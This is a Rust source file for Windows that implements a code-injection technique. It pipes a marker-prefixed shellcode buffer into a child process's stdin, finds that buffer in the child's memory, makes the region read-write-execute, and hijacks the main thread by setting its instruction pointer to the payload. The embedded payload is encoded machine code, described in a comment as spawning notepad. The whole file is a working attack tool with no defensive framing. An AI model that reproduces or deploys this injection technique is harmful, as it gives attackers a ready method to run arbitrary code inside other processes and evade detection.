use std::{env,ptr,thread,time::Duration};
use std::ffi::{CString, NulError, c_void};


use windows::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, ReadProcessMemory, SetThreadContext};
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_PRIVATE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE, PAGE_GUARD, PAGE_NOACCESS, PAGE_PROTECTION_FLAGS, VirtualProtectEx, VirtualQueryEx};
use windows::Win32::System::Pipes::{CreatePipe};
use windows::Win32::Foundation::{CloseHandle, HANDLE, HANDLE_FLAG_INHERIT, SetHandleInformation, INVALID_HANDLE_VALUE};
use windows::Win32::Security::{SECURITY_ATTRIBUTES};
use windows::Win32::System::Threading::{CREATE_NEW_CONSOLE, CreateProcessA, NORMAL_PRIORITY_CLASS, OpenThread, PROCESS_INFORMATION, ResumeThread, STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOA, SuspendThread, THREAD_ALL_ACCESS, WaitForMultipleObjects};
use windows::Win32::Storage::FileSystem::{ReadFile, WriteFile};
use windows::Win32::System::IO::{OVERLAPPED};
use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};
use windows::core::{PSTR,PCSTR};

struct Handle {
    h_std_in_read: HANDLE,
    h_std_in_write: HANDLE,
    h_std_out_read: HANDLE,
    h_std_out_write: HANDLE,
    security_attr: SECURITY_ATTRIBUTES,
}

#[derive(Default)]
struct MemoryInfo {
    r_base_addr: usize,
    r_size: usize,
    offset: usize,
    oldflag: PAGE_PROTECTION_FLAGS,
}

fn get_args() -> Result<CString,NulError> {

    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("[-] Programme path is required");
    }

    let result = CString::new(args[1].clone());
    match result {
        Ok(path) => Ok(path),
        Err(e) => Err(e),
    }

}

fn create_pipe() -> Handle {

    let mut h_std_in_r: HANDLE = HANDLE(ptr::null_mut());
    let mut h_std_in_w: HANDLE = HANDLE(ptr::null_mut());
    let mut h_std_out_r: HANDLE = HANDLE(ptr::null_mut());
    let mut h_std_out_w: HANDLE = HANDLE(ptr::null_mut());


    let security_attr: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: true.into(),
    };

    let sa = Some(&security_attr as *const SECURITY_ATTRIBUTES);

    let result = unsafe {CreatePipe(&mut h_std_in_r, &mut h_std_in_w, sa, 0) };
    match result {
        Ok(()) => {
            println!("[+] Successfully creating STDIN pipe");
        },
        Err(e) => println!("[-] Error while creating pipe: {e}") ,
    }

    let result = unsafe {
        SetHandleInformation(h_std_in_w, 0,HANDLE_FLAG_INHERIT)
    };
    match result {
        Ok(()) => println!("[+] Change HANDLE FLAGS"),
        Err(e) => println!("[-] Failed to change HANDLE FLAGS {e}"),
    }

    let result = unsafe {CreatePipe(&mut h_std_out_r, &mut h_std_out_w, sa, 0) };
    match result {
        Ok(()) => {
            println!("[+] Successfully creating STDOUT pipe");
        },
        Err(e) => println!("[-] Error while creating pipe: {e}") ,
    }

    let result = unsafe {
        SetHandleInformation(h_std_out_r, 0,HANDLE_FLAG_INHERIT)
    };
    match result {
        Ok(()) => println!("[+] Change HANDLE FLAGS"),
        Err(e) => println!("[-] Failed to change HANDLE FLAGS {e}"),
    }


    let my_handle = Handle {
        h_std_in_read: h_std_in_r,
        h_std_in_write: h_std_in_w,
        h_std_out_read: h_std_out_r,
        h_std_out_write: h_std_out_w,
        security_attr: security_attr,
    };

    my_handle

}

fn find_offset(ns_handle: HANDLE, pattern: &[u8]) -> Option<MemoryInfo> {
    
    let mut system_info: SYSTEM_INFO = SYSTEM_INFO {..Default::default()};
    unsafe { GetSystemInfo(&mut system_info);}

    let mut memory_info: MEMORY_BASIC_INFORMATION = MEMORY_BASIC_INFORMATION {..Default::default()};
    let start_address = system_info.lpMinimumApplicationAddress as *const c_void;
    let memory_info_size: usize = size_of::<MEMORY_BASIC_INFORMATION>();
    let mut addr: usize = start_address as usize;
    let mut read_memory_buffer = vec![0u8;4096];
    let mut bytes_read :usize = 0;
    let mut current_addr: usize;

    loop {

        let result  = unsafe {
            VirtualQueryEx(ns_handle, Some(addr as *const c_void), &mut memory_info, memory_info_size)
        };

        // verify VirtualQueryEx not failed
        if result == 0 {
            println!("[-] Failed to get VirtualMemory Region size equal: {result}");
            break None;
        }

        // save current addr for read memory
        current_addr = addr;
        // prepare addr for next iteration
        addr += memory_info.RegionSize;
        // println!("[*] Next region base address: {:#x}", addr);
        if addr >= system_info.lpMaximumApplicationAddress as usize {
            break None;
        }

        // search for correct memory region
        // Verify is memory is commited
        if memory_info.State != MEM_COMMIT {
            continue;
        }
        // Verify if memory region is no_acces or is a page guard
        if memory_info.Protect.contains(PAGE_GUARD) || memory_info.Protect.contains(PAGE_NOACCESS) {
            continue;
        }
        // Verify if region MEM_PRIVATE
        if memory_info.Type != MEM_PRIVATE {
            continue;
        }


        // println!("[*] Reading @ {:#x}, Region size: {:?}",current_addr,memory_info.RegionSize);
        let region_start: usize = current_addr;
        // loop for full reading memory region
        loop {
            
            if (current_addr - region_start) == memory_info.RegionSize {
                break;
            } else {
                let result = unsafe {
                    ReadProcessMemory(ns_handle,
                        current_addr as *const c_void,
                        read_memory_buffer.as_mut_ptr() as *mut c_void,
                        read_memory_buffer.len(), 
                        Some(&mut bytes_read))
                };

                match result {
                    Ok(_) => {
                        // println!("[+] Successfully reading @ {:#x}, length {:?}",current_addr,bytes_read);
                        let index = read_memory_buffer.windows(pattern.len()).position(|window| window == pattern);
                        match index {
                            Some(idx) => {
                                let offset = current_addr + idx;
                                println!("[+] Find pattern in memory at {:#x}",offset);
                                
                                let mem_info: MemoryInfo = MemoryInfo {
                                    r_base_addr: region_start,
                                    r_size: memory_info.RegionSize,
                                    offset: offset,
                                    oldflag: memory_info.Protect
                                };
                                return Some(mem_info);
                            },
                            None => {}
                        }
                        
                    },
                    Err(e) => println!("[-] Failed to read process memory: {e}, @ {:#x}", current_addr ),
                }
                    current_addr += read_memory_buffer.len();
            }   
        }

    }

}


fn change_protect(ns_handle: HANDLE, mem_info: &MemoryInfo){

    let new_page_protect: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READWRITE;
    let mut old_page_protect: PAGE_PROTECTION_FLAGS = mem_info.oldflag;
    unsafe {
        let result = VirtualProtectEx(
            ns_handle, 
            mem_info.r_base_addr as *const c_void,
            mem_info.r_size, 
            new_page_protect, 
            &mut old_page_protect);

        match result {
            Ok(_) => println!("[+] Successfully change permission at @ {:#x}",mem_info.r_base_addr),
            Err(e) => println!("[-] Can't change permission: {e}"),
        }
    };

}

fn hijack_main_thread(ns_thread: HANDLE, offset: u64){

    println!("[*] Hijacking main thread...");
    let result = unsafe { SuspendThread(ns_thread)};
    println!("[*] Suspending thread result: {:?}",result);

    let mut context: CONTEXT = CONTEXT::default();
    
    // init the context for retrieve all the register
    context.ContextFlags = CONTEXT_FULL_AMD64;
    let result = unsafe { GetThreadContext(ns_thread,&mut context)};
    match result {
        Ok(_) => println!("[+] Successfully get thread context"),
        Err(e ) => println!("[-] Failed to get thread context: {e}"),
    }

    println!("[*] The RIP point at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);

    let addr_payload: u64 = offset + 15 as u64;
    context.Rip = addr_payload;


    println!("[*] Payload address: {:#x}",addr_payload);
    let result = unsafe { SetThreadContext(ns_thread, &context as *const CONTEXT)};
    match result {
        Ok(_) => println!("[+] Successfully set thread context"),
        Err(e) => println!("[-] Failed to set thread context: {e}")
    }

    println!("[*] The RIP point now at @ {:#x} and RSP @ {:#x}",context.Rip,context.Rsp);

    let result = unsafe { ResumeThread(ns_thread)};
    
    println!("[+] Successfully resuming main thread: {:?}",result);


}


fn main() {
    
    // get path to executable
    let result  = get_args().unwrap();
    let path = result.as_ptr() as *mut u8;
    let cmd_line: PSTR = PSTR::from_raw(path); 

    // get handle of hStdInput / hStdOuput
    let my_handle = create_pipe();

    // fill startup info
    let reserved = PSTR::null();

    let si: STARTUPINFOA = STARTUPINFOA { 
        cb: std::mem::size_of::<STARTUPINFOA>() as u32, 
        lpReserved: reserved,
        dwFlags: STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW, 
        hStdInput: my_handle.h_std_in_read, 
        hStdOutput: my_handle.h_std_out_write, 
        hStdError: my_handle.h_std_out_write,
        ..Default::default()
    };

    // prepare arg for CreateProcess
    let mut pi: PROCESS_INFORMATION = PROCESS_INFORMATION {..Default::default()};
    let app_name = PCSTR::null();
    let env: *const c_void = ptr::null();
    let curr_directory = PCSTR::null();
    let sa = Some(&my_handle.security_attr as *const SECURITY_ATTRIBUTES);


     let result = unsafe {
        CreateProcessA(
            app_name, 
            Some(cmd_line), 
            sa, 
            sa, 
            true, 
            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, 
            Some(env), 
            curr_directory, 
            &si, 
            &mut pi)
    };

    // close unuse handle
    match result {
        Ok(()) => {
            println!("[+] Process create Successfully !");
            let _ = unsafe {CloseHandle(my_handle.h_std_in_read)};
            let _ = unsafe {CloseHandle(my_handle.h_std_out_write)};
            thread::sleep(Duration::from_secs(2));
        },
        Err(e) => println!("[-] Process creation failed: {e}"), 
    };

    // send bytes pattern + payload (spawn notepad)
    let buffer: [u8;342] = [
        0x61,0x62,0x63,0x61,0x62,0x63,0x61,0x62,0x63,0x61,0x62,0x63,0x61,0x62,0x63,
        0x48,0xbf,0xe4,0x67,0xcd,0x22,0x71,
        0x6a,0xd1,0xa7,0x48,0x89,0xe3,0x66,0x81,0xe3,0xe0,0xf8,0xd9,0xce,0x4d,0x31,
        0xe4,0x41,0xb4,0x23,0x48,0x0f,0xae,0x03,0x4c,0x8b,0x7b,0x08,0x49,0xff,0xcc,
        0x4b,0x31,0x7c,0xe7,0x1d,0x4d,0x85,0xe4,
        0x75,0xf3,0x18,0x2f,0x4e,0xc6,0x81,0x82,0x11,0xa7,0xe4,0x67,0x8c,0x73,0x30,
        0x3a,0x83,0xf6,0xb2,0x2f,0xfc,0xf0,0x14,0x22,0x5a,0xf5,0x84,0x2f,0x46,0x70,
        0x69,0x22,0x5a,0xf5,0xc4,0x2f,0x46,0x50,0x21,0x22,0xde,0x10,0xae,0x2d,0x80,
        0x13,0xb8,0x22,0xe0,0x67,0x48,0x5b,0xac,0x5e,0x73,0x46,0xf1,0xe6,0x25,0xae,
        0xc0,0x63,0x70,0xab,0x33,0x4a,0xb6,0x26,0x9c,0x6a,0xfa,0x38,0xf1,0x2c,0xa6,
        0x5b,0x85,0x23,0xa1,0xe1,0x51,0x2f,0xe4,0x67,0xcd,0x6a,0xf4,0xaa,0xa5,0xc0,
        0xac,0x66,0x1d,0x72,0xfa,0x22,0xc9,0xe3,0x6f,0x27,0xed,0x6b,0x70,0xba,0x32,
        0xf1,0xac,0x98,0x04,0x63,0xfa,0x5e,0x59,0xef,0xe5,0xb1,0x80,0x13,0xb8,0x22,
        0xe0,0x67,0x48,0x26,0x0c,0xeb,0x7c,0x2b,0xd0,0x66,0xdc,0x87,0xb8,0xd3,0x3d,
        0x69,0x9d,0x83,0xec,0x22,0xf4,0xf3,0x04,0xb2,0x89,0xe3,0x6f,0x27,0xe9,0x6b,
        0x70,0xba,0xb7,0xe6,0x6f,0x6b,0x85,0x66,0xfa,0x2a,0xcd,0xee,0xe5,0xb7,0x8c,
        0xa9,0x75,0xe2,0x99,0xa6,0x34,0x26,0x95,0x63,0x29,0x34,0x88,0xfd,0xa5,0x3f,
        0x8c,0x7b,0x30,0x30,0x99,0x24,0x08,0x47,0x8c,0x70,0x8e,0x8a,0x89,0xe6,0xbd,
        0x3d,0x85,0xa9,0x63,0x83,0x86,0x58,0x1b,0x98,0x90,0x6a,0xcb,0x6b,0xd1,0xa7,
        0xe4,0x67,0xcd,0x22,0x71,0x22,0x5c,0x2a,0xe5,0x66,0xcd,0x22,0x30,0xd0,0xe0,
        0x2c,0x8b,0xe0,0x32,0xf7,0xca,0x9a,0x64,0x05,0xb2,0x26,0x77,0x84,0xe4,0xd7,
        0x4c,0x58,0x31,0x2f,0x4e,0xe6,0x59,0x56,0xd7,0xdb,0xee,0xe7,0x36,0xc2,0x04,
        0x6f,0x6a,0xe0,0xf7,0x15,0xa2,0x48,0x71,0x33,0x90,0x2e,0x3e,0x98,0x18,0x4c,
        0x1e,0x1e,0xb4,0xd7,0x85,0x03,0xe3,0x47,0x09,0x0f,0xd1,0xef
        ];

    let mut byte_written: u32= 0;
    let mut overlapped = OVERLAPPED{..Default::default()};

    let result = unsafe {
        //lpnumberofbytewritten w/o coercion, lpoverlapped w/ coercion
        WriteFile(my_handle.h_std_in_write, Some(&buffer), Some(&mut byte_written as *mut u32), Some(&mut overlapped)) 
    };

    match result {
        Ok(()) => println!("[+] Successfully write 342 bytes into process:{:?}", byte_written),
        Err(e) => println!("[-] Error while writing in process: {e}"),
    };

    let mut buffer_out:[u8;512] = [0;512];
    let mut byte_read: u32 = 0;

    let result = unsafe { 
        ReadFile(my_handle.h_std_out_read, Some(&mut buffer_out),Some(&mut byte_read), Some(&mut overlapped))
    };
    
    match result {
        Ok(_) => {
            println!("[+] Bytes recieved: {:?}",byte_read);
            // let data = String::from_utf8_lossy(&buffer_out);
            // println!("[*] STDOUT: {:?}",data);

        },
        Err(e) => println!("[-] Error while recieved: {e}")
    }

    let ns_handle : HANDLE = pi.hProcess;
    let result = find_offset(ns_handle, &buffer);

    let mem_info = match result{   
        Some(mem_info) => mem_info,
        None => MemoryInfo::default(),
    };

    // change protection to RWX in the region that contain the payload
    change_protect(ns_handle, &mem_info);

    let ns_thread: HANDLE = pi.hThread;
    println!("[*] ThreadID: {:?}",pi.dwThreadId);
    let offset: u64 = mem_info.offset as u64; 
    hijack_main_thread(ns_thread, offset);

    byte_written = 0;
    let mut overlapped = OVERLAPPED{..Default::default()};
    let input = b"\n";
    let _ = unsafe {
        WriteFile(my_handle.h_std_in_write, Some(input), Some(&mut byte_written), Some(&mut overlapped))
    };
    println!("[*] Triggered ReadFile with {} bytes", byte_written);

    unsafe {
    
        let _ = CloseHandle(my_handle.h_std_in_write);
        let _ = CloseHandle(my_handle.h_std_out_read);
        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);
    };
    

}


